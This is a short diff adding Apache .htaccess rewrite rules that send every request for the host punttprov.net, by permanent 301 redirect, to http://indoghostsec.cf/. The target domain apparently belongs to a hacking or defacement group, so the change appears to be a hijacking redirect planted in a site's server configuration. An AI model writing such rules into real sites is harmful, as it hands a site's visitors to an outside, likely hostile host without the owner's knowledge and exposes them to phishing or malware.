@@ -1,0 +1,3 @@
+RewriteEngine On
+RewriteCond %{HTTP_HOST} punttprov.net$
+RewriteRule ^(.*) http://indoghostsec.cf/ [R=301,L]
